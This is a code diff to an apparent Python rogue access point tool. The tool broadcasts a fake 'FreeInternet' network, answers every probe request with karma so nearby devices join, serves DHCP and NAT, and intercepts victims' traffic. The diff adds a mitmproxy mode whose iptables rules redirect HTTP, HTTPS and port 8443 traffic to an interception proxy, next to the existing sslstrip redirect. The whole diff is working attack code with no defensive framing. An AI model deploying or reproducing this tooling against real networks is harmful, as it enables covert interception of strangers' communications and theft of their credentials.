@@ -26,9 +26,10 @@ class rogueAP:
         self.ssid = kwargs.get("ssid", "FreeInternet")
         self.wlan_iface = kwargs.get("wlan_iface", "mon0")    # If none, will use first wlan capable of injection
         self.net_iface = kwargs.get("net_iface", "eth0")    # iface with outbound internet access
-        self.enable_mon = kwargs.get("enable_mon", False)   # airmon-ng start <wlan_iface> 
+        self.enable_mon = kwargs.get("enable_mon", False)   # airmon-ng start <wlan_iface>
         self.promisc =   kwargs.get("promisc", False)       # Answer all probe requests
         self.do_sslstrip = kwargs.get("sslstrip", False)
+        self.do_mitmproxy = kwargs.get("mitmproxy", False)
         self.rogueif = kwargs.get("rogueif", "wlan5")       # Answer all probe requests
         self.hostapd = kwargs.get("hostapd", False)       # Use hostapd instead of airbase-ng
         self.hapdconf = kwargs.get("hapdconf", "/etc/hostapd.conf")       # Config file to use for hostapd
@@ -47,14 +48,22 @@ class rogueAP:
             #self.num_procs += 1
         else:
             self.do_sslstrip = False
+
+        if self.do_mitmproxy == "True":
+            self.do_mitmproxy = True
+        else:
+            self.do_mitmproxy = False
+
         if self.promisc == "True":
             self.promisc = True
         else:
             self.promisc = False
+
         if self.enable_mon == "True":
             self.enable_mon = True
         else:
             self.enable_mon = False
+
         if self.hostapd == "True":
             self.hostapd = True
         else:
@@ -63,23 +72,29 @@ class rogueAP:
         if self.enable_mon:
             self.wlan_iface=mm.enable_monitor_mode(self.wlan_iface)
 
+        if self.do_sslstrip and self.do_mitmproxy:
+            logging.error("ssltrip and mitmproxy are mutually exclusive")
+            sys.exit(-1)
+
         if not self.wlan_iface:
             logging.error("No wlan_iface specified for rogueAP :(")
             if not self.hostapd:
-                sys.exit(-1)        
+                sys.exit(-1)
+
         if self.hostapd:
-            airb_opts = [self.hapdconf]    
+            airb_opts = [self.hapdconf]
             self.airb_cmd = [self.hapdcmd] + airb_opts
             self.rogueif = self.wlan_iface
         else:
             self.rogueif = "at0"
-            if self.promisc:    
-                airb_opts = ['-e', self.ssid, '-P', self.wlan_iface]
+            if self.promisc:
+                airb_opts = ['-c 6 -e', self.ssid, '-P -C 60', self.wlan_iface]
             else:
                 airb_opts = ['-e', self.ssid, self.wlan_iface]
             self.airb_cmd = ['airbase-ng'] + airb_opts
 
-        self.airb_cmd = " ".join(self.airb_cmd)      
+        self.airb_cmd = " ".join(self.airb_cmd)
+        print self.airb_cmd
         self.set_ip_cmd = "ifconfig "+self.rogueif+" up 10.0.0.1 netmask 255.255.255.0"
         hapd_config_file ="""
 interface="""+self.rogueif+"""
@@ -103,7 +118,7 @@ enable_karma=1
         f=open('/etc/hostapd.conf', 'w')
         f.write(hapd_config_file)
         f.close()
-        
+
         # Vars for DHCP server
         config_file ="""
 dhcp-range=10.0.0.2,10.0.0.100,255.255.255.0,8765h
@@ -175,7 +190,7 @@ dhcp-leasefile=/etc/dhcpd.leases
 
         logging.info("IP address for access point has been set.")
         return True
-       
+
     def run_dhcpd(self):
         run_program("killall dnsmasq")
         time.sleep(3)
@@ -241,6 +256,10 @@ dhcp-leasefile=/etc/dhcpd.leases
         ipt = ['iptables -F', 'iptables -F -t nat', 'iptables -t nat -A POSTROUTING -o %s -j MASQUERADE'%self.net_iface,  'iptables -A FORWARD -i '+self.rogueif+' -o %s -j ACCEPT'%self.net_iface]
         if self.do_sslstrip:
             ipt.insert(2, 'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
+        if self.do_mitmproxy:
+            ipt.insert(2, 'iptables -t nat -A PREROUTING -i ' + self.rogueif + ' -p tcp --dport 80 -j REDIRECT --to-port 8080')
+            ipt.insert(3, 'iptables -t nat -A PREROUTING -i ' + self.rogueif + ' -p tcp --dport 443 -j REDIRECT --to-port 8080')
+            ipt.insert(4, 'iptables -t nat -A PREROUTING -i ' + self.rogueif + ' -p tcp --dport 8443 -j REDIRECT --to-port 8080')
         for rule in ipt:
             run_program(rule)
         run_program("sysctl -w net.ipv4.ip_forward=1")
@@ -250,7 +269,7 @@ dhcp-leasefile=/etc/dhcpd.leases
         rtnData=[]
         while self.ssl_strip_data:
             rtnData.append(self.ssl_strip_data.popleft())
-        if rtnData: 
+        if rtnData:
             return [("sslstrip", rtnData)]
         else:
             return []
@@ -286,7 +305,7 @@ dhcp-leasefile=/etc/dhcpd.leases
             return False # Still starting up
         for name, proc in self.procs.iteritems():
             if proc.poll():
-                logging.error("Process for %s has died, cannot continue. Sorry." % name) 
+                logging.error("Process for %s has died, cannot continue. Sorry." % name)
                 return False
         return True
 
